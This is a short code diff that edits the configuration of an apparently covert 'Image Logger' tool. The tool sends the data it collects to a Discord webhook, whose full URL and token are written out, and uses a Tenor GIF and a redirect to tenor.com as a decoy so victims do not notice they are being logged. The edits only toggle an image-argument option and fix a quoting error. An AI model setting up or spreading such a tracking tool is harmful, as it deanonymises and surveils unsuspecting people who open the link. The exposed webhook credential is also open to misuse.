@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1441912836455403612/clbBfDcQkz1Tb8wF5nT_u3uEnEGBY8DyZKIdBW6DCA4k92XdV1Vuo6f33tAqmSVEW9mU",
     "image": "https://tenor.com/view/angry-gif-16287667182947970234", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "tenor.com # Link to the webpage to redirect to 
+        "page": "tenor.com", # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
